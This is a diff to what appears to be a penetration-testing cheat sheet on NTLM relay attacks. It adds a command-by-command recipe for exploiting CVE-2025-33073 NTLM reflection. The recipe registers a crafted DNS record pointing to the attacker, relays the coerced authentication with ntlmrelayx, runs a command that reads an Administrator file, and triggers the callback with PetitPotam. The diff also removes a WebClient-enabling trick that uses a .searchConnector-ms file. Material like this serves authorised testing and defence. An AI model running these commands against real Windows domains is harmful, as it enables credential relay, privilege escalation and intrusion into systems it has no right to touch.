@@ -236,6 +236,31 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass target.lab.local  
 ```
 
+## NTLM Reflection - CVE-2025-33073
+
+* Add a DNS record for `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` pointing to our IP address. It is also possible to compromise any vulnerable machine by registering `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`.
+
+    ```ps1
+    dnstool.py -u 'domain.local\username' -p 'P@ssw0rd' 10.10.10.10 -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 198.51.100.27
+    # OR
+    pretender -i "vmnet2" --spoof "target1UWhR..." --no-dhcp --no-timestamps
+    ```
+
+* Start the relay to catch the callback from TARGET.
+
+    ```ps1
+    ntlmrelayx.py -t smb://TARGET.domain.local -smb2support
+    ntlmrelayx.py -t smb://TARGET.domain.local -smb2support -c 'type C:\Users\Administrator\Desktop\flag.txt'
+    ```
+
+* Trigger a callback from the server to `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` using PetitPotam.
+
+    ```ps1
+    nxc smb TARGET.domain.local -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitpotam LISTENER=target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+    # OR
+    petitpotam.py -d domain.local -u username -p 'password' "TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "TARGET.DOMAIN.LOCAL"
+    ```
+
 ## Relaying with WebDav Trick
 
 > Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB
@@ -243,29 +268,6 @@ secretsdump.py -k -no-pass target.lab.local
 **Requirement**:
 
 * WebClient service
-
-**Enable WebClient**:
-
-WebClient service can be enable on the machine using several techniques:
-
-* Mapping a WebDav server using `net` command : `net use ...`
-* Typing anything into the explorer address bar that isn't a local file or directory
-* Browsing to a directory or share that has a file with a `.searchConnector-ms` extension located inside.
-
-    ```xml
-    <?xml version="1.0" encoding="UTF-8"?>
-    <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
-        <description>Microsoft Outlook</description>
-        <isSearchOnlyItem>false</isSearchOnlyItem>
-        <includeInStartMenuScope>true</includeInStartMenuScope>
-        <templateInfo>
-            <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
-        </templateInfo>
-        <simpleLocation>
-            <url>https://example/</url>
-        </simpleLocation>
-    </searchConnectorDescription>
-    ```
 
 **Exploitation**:
 
@@ -406,6 +408,7 @@ By default the SMB service is listening on port 445, blocking any relaying attem
 * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
 * [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema - June 13, 2019](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
 * [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
+* [NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073 - Wilfried Bécard and Guillaume André - June 11, 2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
 * [NTLM Relaying to LDAP - The Hail Mary of Network Compromise - @logangoins - July 23, 2024](https://logan-goins.com/2024-07-23-ldap-relay/)
 * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
 * [Relay Your Heart Away - An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - Aug 1, 2024](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac)
